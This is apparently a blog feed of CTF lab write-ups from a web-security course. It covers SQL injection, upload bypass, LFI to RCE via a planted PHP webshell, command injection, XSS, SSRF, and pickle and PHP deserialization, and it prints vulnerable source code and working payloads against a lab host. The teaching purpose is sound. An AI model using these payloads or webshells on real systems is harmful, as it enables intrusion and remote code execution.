http://h4ck3r.quest:8201/
Exploit - SQLi Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=’’) or (‘1’=‘1’) – #’) AND (password=‘MTIz’) Flag: FLAG{b4by_sql_inj3cti0n}
Revenge source code :::spoiler code
from flask import Flask, render_template, redirect, request, g, Response import sqlite3 app = Flask(__name__) def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect('/tmp/database.db') db.row_factory = sqlite3.Row return db @app.before_first_request def init_db(): cursor = get_db().cursor() cursor.execute(""" CREATE TABLE IF NOT EXISTS "admin" ( "username" TEXT NOT NULL, "password" TEXT NOT NULL ) """) cursor.execute("SELECT COUNT(*) as count FROM admin WHERE username='admin'") count = cursor.fetchone()['count'] if count == 0: import secrets cursor.execute("INSERT INTO admin (username, password) VALUES (?,?)", ('admin', secrets.token_urlsafe())) get_db().commit() @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() @app.route("/") def home(): return render_template("index.html", failed=request.args.get('failed') != None) @app.route("/login", methods=['POST']) def login(): username = request.form.get('username') password = request.form.get('password') if not username or not password: return redirect("/?failed") cur = get_db().execute(f"SELECT * FROM admin WHERE (username='{username}')") res = cur.fetchone() cur.close() if res['username'] == 'admin' and res['password'] == password: return "FLAG: FLAG{&lt;REDACTED>}" return redirect("/?failed") @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{&lt;REDACTED>}', source_code, 1) return Response(source_code, mimetype='text/plain') if __name__ == '__main__': app.run(debug=True) :::</description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</guid><description>Simple Web 0x04(Lab - Image Space 0x01) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9010
Source code :::spoiler code
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;!-- upload form --> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</guid><description>Simple Web 0x05(Lab - Image Space 0x02) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9011
Source code :::spoiler
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</guid><description>Simple Web 0x06(Lab - Image Space 0x03) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9012
Background file signature
Source code :::spoiler
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false) { die("Invalid file type: " . $_SERVER["CONTENT_TYPE"]); } list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']); if ($type !== IMAGETYPE_JPEG &amp;&amp; $type !== IMAGETYPE_PNG) { die("Invalid image type."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> ::: It has 2 extra constraint must be bypassed. Use burpsuite and change valid file signature</description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</guid><description>Simple Web 0x07(Lab - HakkaMD) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8401
Background 資安這條路-Local File Inclusion
Exploit - LFI to RCE First things first, the website has LFI problem http://h4ck3r.quest:8401/?module=/etc/passwd 通靈 It provided phpinfo() so that we can check the save address of session. The setting is default, thus we can use LFI to read session file: http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1 We can see that session file store the data of what we enter. Therefore, we could enter webshell to get shell webshell &lt;?php system($_GET['sh']); ?> ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=ls%20/ ↓ ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=cat%20/flag_aff6136bbef82137 Then we got flag!!!</description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</guid><description>Simple Web 0x08(Lab - My First Meow Website) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8400/ Target: Login as Admin
Background PHP 偽協議 (一) Web Security 0x1
Exploit Observe According to the URL, http://h4ck3r.quest:8400/?page=inc/home, it might have LFI problem. Use php://filter to read page http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home :::spoiler page source code &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>Meow&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css"> &lt;/head> &lt;body> &lt;nav class="navbar is-dark" role="navigation" aria-label="main navigation"> &lt;div class="navbar-brand"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home">🐱&lt;/a> &lt;/div> &lt;div id="navbarBasicExample" class="navbar-menu"> &lt;div class="navbar-start"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home"> Home &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/about"> About &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/admin.php"> Admin &lt;/a> &lt;/div> &lt;/div> &lt;/nav> &lt;div class="container" style="margin-top: 1em;"> &lt;?php if (isset($_GET['page'])) include($_GET['page'] . ".php"); else include("inc/home.php"); ?> &lt;/div> &lt;/body> &lt;/html> ::: Observe page source code We know that admin.php is under / directory. http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin :::spoiler admin source code &lt;h1>Admin Panel&lt;/h1> &lt;form> &lt;input type="text" name="username" value="admin"> &lt;input type="password" name="password"> &lt;input type="submit" value="Submit"> &lt;/form> &lt;?php $admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ"); if ( isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; $_GET['username'] === $admin_account['username'] &amp;&amp; $_GET['password'] === $admin_account['password'] ) { echo "&lt;h1>LOGIN SUCCESS!&lt;/h1>&lt;p>".getenv('FLAG')."&lt;/p>"; } ?> ::: Then we get admin password is: kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ. Then we got flag!!!</description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</guid><description>Simple Web 0x09(Lab - DNS Lookup Tool) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8300/
Source code :::spoiler code
&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | Baby&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre>&lt;?= shell_exec("host '" . $_POST['name'] . "';") ?>&lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a id="magic">Magic&lt;/a> | &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;article class="message is-link is-hidden is-size-4" id="hint"> &lt;div class="message-body is-family-monospace"> host '&lt;span class="has-text-danger" id="command">&lt;/span>'; &lt;/div> &lt;/article> &lt;/div> &lt;/div> &lt;/section> &lt;script> magic.onclick = () => hint.classList.toggle("is-hidden"); window.onload = hostname.oninput = () => command.textContent = hostname.value; &lt;/script> &lt;/body> &lt;/html> :::</description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</guid><description>Simple Web 0x10(Lab - DNS Lookup Tool | WAF) tags: NTUSTWS CTF Web Background 2022/03/30 網頁安全 Command injection
Source code :::spoiler code
&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | WAF&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍 | WAF Edition&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre> &lt;?php $blacklist = ['|', '&amp;', ';', '>', '&lt;', "\n", 'flag']; $is_input_safe = true; foreach ($blacklist as $bad_word) if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false; if ($is_input_safe) system("host '" . $_POST['name'] . "';"); else echo "HACKER!!!"; ?> &lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;/div> &lt;/div> &lt;/section> &lt;/body> &lt;/html> ::: It set some protection such as blacklist.</description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</guid><description>Simple Web 0x11(Lab - XSS Me) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8800/
Background :::spoiler 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取COOKIE之類的) :::
Source code ... &lt;script> const message = {"icon": "error", "titleText": "User not found.", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Exploit Check XSS ... &lt;script> const message = {"icon": "error", "titleText": "youshallnotpass", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Try to inject script tag Payload: http://h4ck3r.quest:8800/?type=error&amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E// ... &lt;script> const message = {"icon": "error", "titleText": "&lt;/script>&lt;script>alert(123)&lt;/script>//", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> Hint If you login as guest(password = guest), then you can get the response Fetch flag and send to beeceptor Payload:</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Exploit - SSRF When you see a preview function, then it may have SSRF problem.
Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Exploit - SSRF When you see a preview function, then it may have SSRF problem.
Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</guid><description>Simple Web 0x13(Lab - SSRFrog) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8501/
Background javascript Set() Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Source code :::spoiler source code
const express = require("express"); const http = require("http"); const app = express(); app.get("/source", (req, res) => { return res.sendFile(__filename); }) app.get('/', (req, res) => { const { url } = req.query; if (!url || typeof url !== 'string') return res.sendFile(__dirname + "/index.html"); // no duplicate characters in `url` if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png"); try { http.get(url, resp => { resp.setEncoding("utf-8"); resp.statusCode === 200 ? resp.on('data', data => res.send(data)) : res.send(":("); }).on('error', () => res.send("WTF?")); } catch (error) { res.send("WTF?"); } }); app.listen(3000, '0.0.0.0'); :::</description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</guid><description>Simple Web 0x14(Lab - Debug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9020/
Background Source code :::spoiler source code
from flask import Flask, request, Response import urllib.request import json app = Flask(__name__) app.config['FLAG'] = "FL4G{fake_flag}" @app.route('/') def index(): return ''' &lt;form action="https://bernie6401.github.io/proxy"> &lt;input type="text" name="url" placeholder="URL"> &lt;input type="submit"> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source Code&lt;/a> | &lt;a href="https://bernie6401.github.io/debug">Debug&lt;/a>&lt;/p> ''' @app.route("/proxy") def proxy(): url = request.args.get("url") if url is None: return "No URL provided" if "https://" not in url: url = "https://" + url try: with urllib.request.urlopen(url) as response: return response.read() except urllib.error.HTTPError as e: return str(e) @app.route("/debug") def debug(): # only allow access for localhost if request.remote_addr != "127.0.0.1": return "Access denied", 403 return json.dumps(app.config, default=lambda _: None) @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{.*}', r'FL4G{fake_flag}', source_code, count=1) return Response(source_code, mimetype='text/plain') :::</description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</guid><description>Simple Web 0x15.5(Pickle) tags: NTUSTWS CTF Web Background - Pickle Python magic method: __reduce__ __recude__ is used to define what needs to be done when deserializing. Web Hacking | 終章【EDU-CTF 2021】
Source code :::spoiler exploit.py
import pickle import os import pickletools class exploit(object): def __reduce__(self): return (os.system, ('pwd',)) serialized = pickle.dumps(exploit()) print(bytes.hex(serialized)) optim_s = pickletools.optimize(serialized) print(pickletools.dis(serialized)) print(pickletools.dis(optim_s)) :::
:::spoiler server_app.py
import pickle serialized = bytes.fromhex(input('Data: ')) pickle.loads(serialized) :::
Output &amp; Analyze In Linux</description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</guid><description>Simple Web 0x15(Lab - Jinja) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8700/
Background Web Security 0x1
Source code :::spoiler code
from flask import Flask, render_template_string, request, send_file app = Flask(__name__) @app.get("/") def home(): return render_template_string(""" &lt;form method="POST"> &lt;input type="text" name="name" placeholder="Your name"> &lt;button>submit&lt;/button> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source code&lt;/a>&lt;/p> """) @app.post("/") def welcome_message(): name = request.form.get('name') return render_template_string("&lt;p>Hello, " + name + "&lt;/p>") @app.get("/source") def source(): return send_file(__file__, mimetype="text/plain") if __name__ == '__main__': app.run(threaded=True, debug=True) :::</description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</guid><description>Simple Web 0x16.5(php unserialize) tags: NTUSTWS CTF Web Background php magic method Source code class cat { public $sound = 'ls'; function __wakeup() { system("echo".$this->sound); } } $cat = unserialize($_GET['cat']); Description &amp; Analyze $ php -a php > class cat php > public { php { public $sound = 'ls'; php { function __wakeup() php { { php { system("echo ".$this->sound); php { } php { } php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:"meow";}'; php > $cat = unserialize($_GET['cat']); meow php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:";id;";}'; php > $cat = unserialize($_GET['cat']); uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker) This is a typical command injection. The magic method __wakeup() will be called when unserialized something.</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
Background 0x15.5(Pickle)
Source code :::spoiler code
from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
Background 0x15.5(Pickle)
Source code :::spoiler code
from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
Background 0x16.5(php unserialize)
Source code :::spoiler code
&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/index.html</guid><description>Simple Web 0x17(Lab - Baby Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8601/
Background 0x16.5(php unserialize)
Source code :::spoiler code
&lt;?php isset($_GET['source']) &amp;&amp; die(!show_source(__FILE__)); class Cat { public $name = '(guest cat)'; function __construct($name) { $this->name = $name; } function __wakeup() { echo "&lt;pre>"; system("cowsay 'Welcome back, $this->name'"); echo "&lt;/pre>"; } } if (!isset($_COOKIE['cat_session'])) { $cat = new Cat("cat_" . rand(0, 0xffff)); setcookie('cat_session', base64_encode(serialize($cat))); } else { $cat = unserialize(base64_decode($_COOKIE['cat_session'])); } ?> &lt;p>Hello, &lt;?= $cat->name ?>.&lt;/p> &lt;a href="https://bernie6401.github.io/?source">source code&lt;/a> :::</description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/index.html</guid><description>Simple Web 0x18(Lab - Magic Cat) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8602/
Background None…
Source code :::spoiler code
